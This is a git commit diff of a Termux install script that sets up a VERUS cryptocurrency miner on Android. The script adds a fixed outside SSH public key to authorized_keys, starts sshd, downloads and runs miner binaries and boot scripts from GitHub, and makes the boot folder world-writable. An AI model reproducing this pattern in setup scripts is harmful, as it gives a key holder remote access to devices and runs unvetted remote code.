16a529682c4c9474d0cab09e3b9575d2393625b6
Daniel <163345545+btcdollar@users.noreply.github.com>
2024-10-01 13:36:10 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,8 +1,4 @@
 #!/bin/bash
-
-config='config.json'
-ssh_passwd='Passw0rd!'
-
 NC='\033[0m'
 R='\033[0;31m'   #'0;31' is Red's ANSI color code
 G='\033[0;32m'   #'0;32' is Green's ANSI color code
@@ -19,39 +15,31 @@ echo -e "${LC}#             ${LB}VERUS ${LP}Miner ${G}SETUP             ${LC}#${
 echo -e "${LC}#                                           ${LC}#${NC}"
 echo -e "${LC}#              v1.0 | by Ch3ckr             ${LC}#${NC}"
 echo -e "${LC}#############################################${NC}"
-
-echo -e "\n"
-yes | pkg update > /dev/null 2>&1
-yes | pkg upgrade > /dev/null 2>&1
+yes | pkg update
+yes | pkg upgrade
 echo -e "${R}-> ${NC}Software Update: ${LG}COMPLETE${NC}"
-yes | pkg install cronie termux-services libjansson wget nano screen nmap openssh > /dev/null 2>&1
+yes | pkg install cronie termux-services libjansson wget nano screen nmap openssh
 mkdir ~/.ssh
 chmod 0700 ~/.ssh
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOAPjnQbztXVnQDGl1Xqty7kFyTZY4MEJgCn6Et6vRpivHV+dMHyLnsCp2iAxDnh99ld9P8adVpwWdOaaUm3wzxzRFK+83ZZGGuFO6/BRzC8J0D4CFur++rVdC8zHhyaGKTVU/I10dpYwVfnfyYjhBoFhb8lnMp3SIkd56HnHJDuAWg6Cr31wvevUbulOHh6uOaBdvyyAJxY8ASHyPOEDDIlo+4/oirMudO0L46zTvxktmAby0ZwD4jOcUK2K52L0+Xe7zWBRnDtY9bKTLoJFQ9McSVzoVTsXxlvGIJmW0WGTPfLf/o3w5T+JiE1vJL2/S+A7YSMgo952fofGl6r6R" > ~/.ssh/authorized_keys
 chmod 0600 ~/.ssh/authorized_keys
 sshd 2>&1 > /dev/null 2>&1
 echo -e "${R}-> ${NC}Starting SSHD: ${LG}COMPLETE${NC}"
-mkdir -p ~/.termux/boot && mkdir ~/ccminer && cd ~/ccminer > /dev/null 2>&1
+mkdir -p ~/.termux/boot && mkdir ~/ccminer && cd ~/ccminer
 echo -e "${R}-> ${NC}Creating Miner & Boot Folders: ${LG}COMPLETE${NC}"
-wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/ccminer_a53 -O ~/ccminer/ccminer > /dev/null 2>&1
-wget https://raw.githubusercontent.com/btcdollar/nana/main/start.sh > /dev/null 2>&1
-wget https://raw.githubusercontent.com/btcdollar/nana/main/${config}  > /dev/null 2>&1
-mv ${config} config.json > /dev/null 2>&1
-chmod +x ccminer start.sh > /dev/null 2>&1
-cd ~/.termux/boot > /dev/null 2>&1
-wget https://raw.githubusercontent.com/btcdollar/nana/main/boot_start > /dev/null 2>&1
-chmod -R 777 ~/.termux/boot > /dev/null 2>&1
+wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/ccminer_a53 -O ~/ccminer/ccminer
+wget https://raw.githubusercontent.com/btcdollar/nana/main/start.sh
+wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/config.json
+chmod +x ccminer start.sh
+cd ~/.termux/boot
+wget https://raw.githubusercontent.com/btcdollar/nana/main/boot_start
+chmod -R 777 ~/.termux/boot
 echo -e "${R}-> ${NC}Downloading config: ${LG}COMPLETE${NC}"
-cd ~ > /dev/null 2>&1
-rm ncc.sh > /dev/null 2>&1
-wget https://raw.githubusercontent.com/btcdollar/nana/main/ncc.sh > /dev/null 2>&1
-chmod 777 ncc.sh > /dev/null 2>&1
-mkdir ~/.cache > /dev/null 2>&1
-(crontab -l 2>/dev/null; echo "*/5 * * * * ~/ncc.sh") | crontab - > /dev/null 2>&1
-echo -e "${R}-> ${NC}Installing NetworkCheck: ${LG}COMPLETE${NC}"
-~/ccminer/start.sh > /dev/null 2>&1
-echo -e "${R}-> ${NC}Starting Miner: ${LG}COMPLETE${NC}"
-echo -e "\n"
+cd
+rm ncc.sh
+wget https://raw.githubusercontent.com/btcdollar/nana/main/ncc.sh
+chmod 777 ncc.sh
+mkdir ~/.cache
 echo -e "${R}-> ${LB}VERUS ${NC}SETUP: ${LG}COMPLETE ${R}-> REBOOT${NC}"
 sleep 5
 su -c reboot
